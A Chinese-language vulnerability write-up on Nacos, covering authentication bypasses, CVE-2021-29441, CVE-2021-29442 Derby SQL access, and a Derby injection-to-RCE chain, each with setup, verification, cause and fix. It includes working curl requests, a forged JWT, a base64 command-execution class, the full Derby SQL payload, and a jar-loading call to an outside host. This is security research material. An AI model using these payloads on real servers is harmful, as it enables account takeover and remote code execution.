@@ -1,0 +1,317 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>文章开头说一下nacos系列安全问题的根本原因，如官方的开发文档所说</p>
+<p>Nacos提供简单的鉴权实现，为防止业务错用的弱鉴权体系，不是防止恶意攻击的强鉴权体系</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728095144-f129c23e-4c83-1.png"/></p>
+<h1 data-content="1" id="8bb8057d60468ae06cda064378a0ad7d">权限绕过类</h1>
+<p>除CVE-2021-29441，都是研发人员在代码中没有将以下鉴权功能配置正确导致的权限绕过</p>
+<pre><code># 开启鉴权
+nacos.core.auth.enabled=true
+nacos.core.auth.system.type=nacos
+# 开启鉴权之后，你可以自定义用于生成JWT令牌的密钥  
+# The default token(Base64 String)
+# 自定义密钥时，推荐将配置项设置为Base64编码的字符串，且原始密钥长度不得低于32字符。  
+nacos.core.auth.default.token.secret.key=
+# 关闭使用user-agent判断服务端请求并放行鉴权的功能
+nacos.core.auth.enable.userAgentAuthWhite=false
+# 当以上两个属性这样如此设置时，以下两个属性生效
+# 配置自定义身份识别的key（不可为空）和value（不可为空）
+# 这两个属性是授权白名单，用于标识来自其他服务器的请求。
+nacos.core.auth.server.identity.key=nacosKey
+nacos.core.auth.server.identity.value=nacosValue</code></pre>
+<h3 data-content="1" id="36be65ad7aecd72a0b90ff37b68da41b">Nacos默认配置未授权访问漏洞 - nacos.core.auth.enabled = false</h3>
+<p>漏洞简介<br/>
+这个漏洞，网上有不少文章将其原理简单归为CVE- 2021-29441中的描述，实际上并不是一个东西。此漏洞不需要添加任何身份标识来绕过校验，仅仅是因为默认配置未开启鉴权<br/>
+环境搭建<br/>
+Nacos gtihub下载地址<br/>
+<a href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1" target="_blank">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br/>
+win11环境搭建</p>
+<pre><code>\JAVA\nacos\bin&gt;startup.cmd -m standalone</code></pre>
+<p>localhost:8848/nacos/#/login</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728095246-1642890c-4c84-1.png"/></p>
+<p>漏洞验证<br/>
+查看用户信息<br/>
+<a href="http://192.168.250.106:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1" target="_blank">http://192.168.250.106:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728095256-1c212f68-4c84-1.png"/></p>
+<p>新建用户</p>
+<pre><code>POST /nacos/v1/auth/users HTTP/1.1
+
+username=test1&amp;password=test1</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728102903-27f31a86-4c89-1.png"/></p>
+<p>成功登录</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728102911-2c59c12e-4c89-1.png"/></p>
+<p>漏洞原理<br/>
+默认未开启配置 nacos.core.auth.enabled</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728102915-2ef77a34-4c89-1.png"/></p>
+<p>在auth/src/main/java/com/alibaba/nacos/auth/common/AuthConfigs.java类中，isAuthEnabled方法的返回值取决于nacos.core.auth.enabled （默认False）</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728102924-347db626-4c89-1.png"/></p>
+<p>在core/src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java类中，根据authConifgs.isAuthEnabled()的返回值默认为flase，所以这里默认跳过检查认证filter，直接进入filterchain的下一个filter</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728102929-378aef78-4c89-1.png"/></p>
+<p>修复方案<br/>
+配置文件修改为：nacos.core.auth.enabled=True<br/>
+修改之后，再次尝试访问<a href="http://192.168.250.106:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1，回显WhitelabelErrorPage" target="_blank">http://192.168.250.106:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1，回显WhitelabelErrorPage</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728102937-3c51bcda-4c89-1.png"/></p>
+<h3 data-content="1" id="e07cbf5b5da78b818091ee384ca0cac3">Nacos默认jwt密钥未授权访问 - default nacos.core.auth.default.token.secret.key</h3>
+<p>漏洞简介<br/>
+开启了nacos.core.auth.enabled 的情况下，如果未修改默认nacos.core.auth.default.token.secret.key，则可以生产accessToken值来绕过权限。<br/>
+配置文件</p>
+<pre><code>### If turn on auth system:
+nacos.core.auth.enabled=true
+
+### The default token:
+nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789</code></pre>
+<p>环境搭建<br/>
+Nacos gtihub下载地址<br/>
+<a href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1" target="_blank">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br/>
+win11环境搭建</p>
+<pre><code>\JAVA\nacos\bin&gt;startup.cmd -m standalone</code></pre>
+<p>localhost:8848/nacos/#/login</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103126-7d122566-4c89-1.png"/></p>
+<p>漏洞验证<br/>
+使用在线的jwt生成网站：<a href="https://jwt.io/" target="_blank">https://jwt.io/</a><br/>
+eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MX0.prKBqb32hvYghIgxzSjzW2nbBn7TDjtYM49zEvxI38g</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103134-81e0bd78-4c89-1.png"/></p>
+<p>将PAYLOAD中exp的值修改为unix时间的五个小时。比如此刻：2024/3/24/11:25/00<br/>
+exp:1711355100<br/>
+然后带accessToken值即可调用接口</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103144-87d57f98-4c89-1.png"/></p>
+<p>漏洞原理</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103148-8a741b92-4c89-1.png"/></p>
+<p>修复方案<br/>
+修改默认的nacos.core.auth.default.token.secret.key</p>
+<h3 data-content="1" id="42497926669e009d8238bc455193b618">Nacos身份认证serverIdentity绕过</h3>
+<p>漏洞简介<br/>
+更合适的说法是危险配置造成的鉴权不严<br/>
+环境搭建<br/>
+配置如下的时候就会造成这个绕过可用</p>
+<pre><code>### If turn on auth system:
+nacos.core.auth.enabled=true
+### Since 1.4.1, Turn on/off white auth for user-agent: nacos-server, only for upgrade from old version.
+nacos.core.auth.enable.userAgentAuthWhite=false
+### Since 1.4.1, worked when nacos.core.auth.enabled=true and nacos.core.auth.enable.userAgentAuthWhite=false.
+### The two properties is the white list for auth and used by identity the request from other server.
+nacos.core.auth.server.identity.key=serverIdentity
+nacos.core.auth.server.identity.value=security
+### The default token (Base64 String) and len(key)&gt;32:
+nacos.core.auth.plugin.nacos.token.secret.key=MTIzNDU2Nzg5MTIzMTI0MzIxNDM2NTRmYmRmMzI0c2R2c2Rh</code></pre>
+<p>漏洞验证</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103211-97d09770-4c89-1.png"/></p>
+<p>在请求头中serverIdentity:security即可绕过jwt鉴权<br/>
+漏洞原理<br/>
+首先逻辑是根据前面的分析判断是否开启nacos.core.auth.enabled和是否开启userAgentAuthWhite，然后是对配置文件是否配置了identity.key&amp;identity.value<br/>
+修复方案<br/>
+这个算漏洞实在很勉强，因为identity.key&amp;identity.value的值其实是自定义的。这个安全隐患更像弱口令。</p>
+<h3 data-content="1" id="735dae9fb2b621bd676f4f4d6b9b29a8">Nacos请求头User-Agent绕过鉴权</h3>
+<p>漏洞简介<br/>
+在Nacos的鉴权管理中，有一项配置是通过User-Agent中是否包含Nacos-Server来进行判断请求是否来自其他服务端。<br/>
+环境搭建<br/>
+版本选择1.4.1<br/>
+配置文件如下</p>
+<pre><code>nacos.core.auth.enable.userAgentAuthWhite=true</code></pre>
+<p>同时在该配置的对应位置也可以看到开发者对此配置的作用做出了解释，1.4.1版本更新之后，这个配置仅支持老版本升级的情况。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103229-a2de329e-4c89-1.png"/></p>
+<p>漏洞验证</p>
+<pre><code>curl 'http://localhost:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9&amp;accessToken=' -H 'User-Agent: Nacos-Serverver'</code></pre>
+<p>直接用curl命令即可完成验证，在请求头中添加了UA:Nacos-Server的时候，即使没有其他任何认证，也可以获取到用户信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103251-afc3d388-4c89-1.png"/></p>
+<p>漏洞原理<br/>
+<a href="https://github.com/alibaba/nacos/issues/4701" target="_blank">https://github.com/alibaba/nacos/issues/4701</a><br/>
+相关代码文件是src/main/java/com/alibaba/nacos/core/auth/AuthFilter.java<br/>
+这里的逻辑也很简单，如果authConfigs.isEnableUserAgentAuthWhite()即配置文件中 nacos.core.auth.enable.userAgentAuthWhite 为true，就会获取请求头中UserAgent的值，然后判断是否是以字符串“Nacos-Server”为开头，若是则直接跳过鉴权。<br/>
+StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103322-c1fdd06c-4c89-1.png"/></p>
+<p>修复方案<br/>
+更改配置文件中默认选项</p>
+<pre><code>nacos.core.auth.enable.userAgentAuthWhite=false</code></pre>
+<h3 data-content="1" id="6718d9d9640a6fb0213d8d6aec4f435b">CVE-2021-29441</h3>
+<p>漏洞简介<br/>
+<a href="https://github.com/alibaba/nacos/issues/4701" target="_blank">https://github.com/alibaba/nacos/issues/4701</a><br/>
+此漏洞是对User-Agent绕过鉴权的一个bypass<br/>
+环境搭建<br/>
+同上文中User-Agent绕过鉴权的环境，区别在此时把UA白名单关闭，以及配置identity.key和identit.value</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103339-cc5e81d2-4c89-1.png"/></p>
+<p>漏洞验证<br/>
+开发者直接删除了漏洞版本的1.4.1（三梦师傅是Jan 14 提的issue，然后封装好的server端是直接更换修复后的了，不过Source code没有换），而低版本中没有对应配置项。所以想要复现试试的可以通过源码编译的方式获取环境。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103352-d45f4b50-4c89-1.png"/></p>
+<pre><code>本文就不贴演示的图，可以放入list的poc如下
+#访问用户列表接口
+curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users/?pageNo=1&amp;pageSize=9'
+可以看到，绕过了鉴权，返回了用户列表数据
+
+{
+    "totalCount": 1,
+    "pageNumber": 1,
+    "pagesAvailable": 1,
+    "pageItems": [
+        {
+            "username": "nacos",
+            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
+        }
+    ]
+}
+#添加新用户
+curl -XPOST 'http://127.0.0.1:8848/nacos/v1/auth/users?username=test&amp;password=test'
+可以看到，绕过了鉴权，添加了新用户
+
+{
+    "code":200,
+    "message":"create user ok!",
+    "data":null
+}
+#再次查看用户列表
+curl XGET 'http://127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=9'
+可以看到，返回的用户列表数据中，多了一个我们通过绕过鉴权创建的新用户
+
+{
+    "totalCount": 2,
+    "pageNumber": 1,
+    "pagesAvailable": 1,
+    "pageItems": [
+        {
+            "username": "nacos",
+            "password": "$2a$10$EuWPZHzz32dJN7jexM34MOeYirDdFAZm2kuWj7VEOJhhZkDrxfvUu"
+        },
+        {
+            "username": "test",
+            "password": "$2a$10$5Z1Kbm99AbBFN7y8Dd3.V.UGmeJX8nWKG47aPXXMuupC7kLe8lKIu"
+        }
+    ]
+}
+#访问首页http://127.0.0.1:8848/nacos/，登录新账号，可以做任何事情</code></pre>
+<p>漏洞原理<br/>
+chains：</p>
+<pre><code>com/alibaba/nacos/core/auth/AuthFilter.java#doFilter 
+com/alibaba/nacos/core/code/ControllerMethodsCache.java#getMethod
+com/alibaba/nacos/core/code/ControllerMethodsCache.java#getPath</code></pre>
+<p>控制path多一个末尾的斜杆'/'，导致从urlLookup这个ConcurrentHashMap中获取不到method</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103411-df66db08-4c89-1.png"/></p>
+<p>为什么呢，因为nacos全部的RequestMapping都没有以斜杆'/'结尾</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103417-e3171754-4c89-1.png"/></p>
+<p>故只有非斜杆'/'结尾的RequestMapping存在并存入了urlLookup这个ConcurrentHashMap。那么，最外层的method == null条件将能满足，从而，绕过该鉴权机制</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103420-e4f1c0ec-4c89-1.png"/></p>
+<p>修复方案<br/>
+有效的解决方案是直接抛出无效URI的异常，根本不会进入到RequestMapping<br/>
+改制过后的getpath函数代码如下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103426-e8813eb8-4c89-1.png"/></p>
+<h1 data-content="1" id="639de7ca5d6a385159c5fc991c6b3d1b">Derby未授权-&gt;SQL注入(CVE-2021-29442)</h1>
+<p>漏洞简介<br/>
+nacos带有一个嵌入式的小型数据库derby，而在版本&lt;=1.4.0的默认配置部署nacos的情况下，它无需认证即可被访问，并执行任意sql查询，导致敏感信息泄露，后上周的所谓Nacos最新0day，其实也就是利用的同一个接口。<br/>
+而CVE-2021-29442是因为最开始开发者没有为这个内存型数据库接口配置任何的访问控制引发的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103505-ff5d8fce-4c89-1.png"/></p>
+<p>环境搭建<br/>
+使用1.4.0的版本进行测试</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103513-0487875c-4c8a-1.png"/></p>
+<p>漏洞验证<br/>
+sql参数后直接跟select语句即可：curl -XGET "<a href="http://127.0.0.1:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20" target="_blank">http://127.0.0.1:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20</a>"</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103519-07ed8676-4c8a-1.png"/></p>
+<p>当然进阶利用是可以直接用下方的代码来破解此处查出来的用户密码的，毕竟加密方式是公开的</p>
+<pre><code>package com.alibaba.nacos.console.utils;
+
+import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
+
+/**
+ * Password encoder tool.
+ *
+ * @author nacos
+ */
+public class PasswordEncoderUtil {
+
+    public static void main(String[] args) {
+        System.out.println(new BCryptPasswordEncoder().encode("nacos"));
+    }
+
+    public static Boolean matches(String raw, String encoded) {
+        return new BCryptPasswordEncoder().matches(raw, encoded);
+    }
+
+    public static String encode(String raw) {
+        return new BCryptPasswordEncoder().encode(raw);
+    }
+}</code></pre>
+<p>漏洞原理<br/>
+漏洞代码 1.4.0的com/alibaba/nacos/core/auth/RequestMappingInfo.java#derbyOps<br/>
+没有任何校验，只要get访问路由/derby即可进行进入函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103535-1167f8c6-4c8a-1.png"/></p>
+<p>而第一个if的值取决于是否standalone模式启动的nacos，所以在standalone模式启动nacos的话，默认就可以进入第一个if</p>
+<pre><code>PropertyUtil.isEmbeddedStorage()
+ApplicationUtils.getStandaloneMode()</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103549-19aa7932-4c8a-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103552-1b62ab46-4c8a-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103555-1d66a28a-4c8a-1.png"/></p>
+<p>第二个if也仅仅是判断了参数sql的值是否以"select"为字符串开头，然后就直接可以使用derby的查询功能了。<br/>
+修复方案<br/>
+参考1.4.1中此处的代码，添加了nacos/admin 的注解来限制仅管理员角色使用该接口(Nacos基于Spring Security来做了访问控制)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103607-247b5ce6-4c8a-1.png"/></p>
+<p>开启鉴权配置后即可做到限制未授权访问</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103611-26ea4212-4c8a-1.png"/></p>
+<h1 data-content="1" id="c273a0963d4786f41ea99d47cabe7f28">Derby未授权-&gt;SQL注入-&gt;RCE</h1>
+<p>漏洞简介<br/>
+这个漏洞其实可以说是CVE-2021-29442的更深层次利用，在上文中我们分析了，Derby未授权SQL注入利用的是/derby这个路由，但是限制了语句必须为select开头的即查询语句，而仅仅是查询语句就无法RCE。所以DerbyRCE的这个漏洞是利用removal接口在完成这个利用链完成derby注入的深入利用（最开始出来的打法用到的是"CALL sqlj.install_jar"简单来说就是将远程服务器上的jar包导入数据库，就可以动态调用类中的static方法），也就是所谓组合拳RCE。<br/>
+环境搭建<br/>
+2.3.2的standalone模式，以默认的配置文件运行就可以了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103621-2cbc3358-4c8a-1.png"/></p>
+<p>漏洞验证<br/>
+目前看到大概有三种利用方式，后面两种是在不出网的场景下可以使用<br/>
+1.CALL sqlj.install_jar 导入远程服务器上的恶意类<br/>
+2.利用SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE写文件，这样可以先将jar包写到本地目录再加载</p>
+<ol>
+<li>create type typeClass external  的方式自定义数据类型来映射java类<br/>
+第三种很秀，在这里记一下第三种的打法<br/>
+首先验证未授权存在</li>
+</ol>
+<p>curl -XGET "<a href="http://192.168.111.130:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20" target="_blank">http://192.168.111.130:8848/nacos/v1/cs/ops/derby?sql=select%20*%20from%20users%20</a>"</p>
+<p>制作命令执行类</p>
+<pre><code>┌──(root㉿kali)-[/tmp]
+└─# vim MaliciousClass.java
+
+--
+public class MaliciousClass {
+    static {
+        try {
+            Runtime.getRuntime().exec("calc");
+        } catch (Exception e) {
+                //TODO:handle exception
+        }
+    }
+}
+--
+
+┌──(root㉿kali)-[/tmp]
+└─# javac MaliciousClass.java 
+
+┌──(root㉿kali)-[/tmp]
+└─# cat MaliciousClass.class | base64
+yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENv
+ZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3Vy
+Y2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNq
+YXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAR
+amF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAE
+ZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAA
+AgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAA
+RwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQAN
+AAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA==</code></pre>
+<p>对应的sql语句</p>
+<pre><code>create type typeClass external name 'java.lang.Class' language java
+create type typeClassLoader external name 'java.lang.ClassLoader' language java
+create function base64Decode(className VARCHAR(32672)) RETURNS VARCHAR(32672) FOR BIT DATA external name 'org.springframework.util.Base64Utils.decodeFromString' language java parameter style java
+create function getSystemClassLoader() returns typeClassLoader external name 'java.lang.ClassLoader.getSystemClassLoader' language java parameter style java
+create function defineClass(className VARCHAR(32672), bytes VARCHAR(32672) FOR BIT DATA, loader typeClassLoader) returns typeClass external name 'org.springframework.cglib.core.ReflectUtils.defineClass(java.lang.String, byte[], java.lang.ClassLoader)' language java parameter style java
+create table test(v typeClass)
+insert into test values (defineClass('MaliciousClass', base64Decode('yv66vgAAADQAHgoABwARCgASABMIABQKABIAFQcAFgcAFwcAGAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHABYBAApTb3VyY2VGaWxlAQATTWFsaWNpb3VzQ2xhc3MuamF2YQwACAAJBwAZDAAaABsBAARjYWxjDAAcAB0BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAOTWFsaWNpb3VzQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAYABwAAAAAAAgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAEACAAMAAkAAQAKAAAARwACAAEAAAAOuAACEgO2AARXpwAES7EAAQAAAAkADAAFAAIACwAAABIABAAAAAQACQAHAAwABQANAAgADQAAAAcAAkwHAA4AAAEADwAAAAIAEA=='), getSystemClassLoader()));</code></pre>
+<p>攻击：curl -X POST -F "file=@./payload.sql" "<a href="http://192.168.111.130:8848/nacos/v1/cs/ops/data/removal" target="_blank">http://192.168.111.130:8848/nacos/v1/cs/ops/data/removal</a>"<br/>
+不出意外的话复现会遇到"file xxx does not exist"，这个实际上是正常的，写个脚本挂着打然后看运气什么时候碰撞成功了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103723-51a6b68e-4c8a-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240728103727-549097fc-4c8a-1.png"/></p>
+<p>漏洞原理<br/>
+两部分，未授权部分的分析在上文已经写出了。<br/>
+derby数据库rce的原理重点就是理解上面写出的打法中用到的函数，第三种在上文中已经写了，这里简单补充下一和二</p>
+<pre><code>#最开始公开poc中的利用方式，这个函数直接导入制定jar包，前提是数据库服务器必须能够访问互联网，这在不出网的目标中不适用
+CALL sqlj.install_jar('http://example.com/malicious.jar', 'APP.malicious_jar', 0)
+
+#先通过数据库的内置工具将 JAR 包写到本地文件系统，然后再加载它
+CALL SYSCS_UTIL.SYSCS_EXPORT_QUERY_LOBS_TO_EXTFILE('SELECT my_blob_column FROM my_table', 'my_exported_file.jar', '&lt;delimiter&gt;')
+CALL sqlj.install_jar('file:///path/to/my_exported_file.jar', 'APP.local_jar', 0)</code></pre>
+<p>修复方案<br/>
+配置好鉴权，不要使用默认的配置文件在生成环境启动服务即可</p>
+</div>
+</div>
